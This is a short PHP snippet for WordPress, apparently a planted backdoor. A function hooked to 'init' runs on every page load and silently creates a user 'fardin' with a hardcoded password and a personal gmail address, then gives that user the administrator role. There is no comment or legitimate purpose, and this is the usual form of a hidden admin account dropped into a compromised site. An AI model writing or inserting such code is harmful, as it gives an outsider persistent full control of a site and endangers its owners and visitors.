<?php
function wpb_admin_account(){
    $user = 'fardin';
    $pass = 'Qt2oHWk$M^Uz$L5UhU2eikdljKtjvQ';
    $email = 'fardin01316049157@gmail.com';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
        $user_id = wp_create_user( $user, $pass, $email );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
    }
}
add_action('init','wpb_admin_account');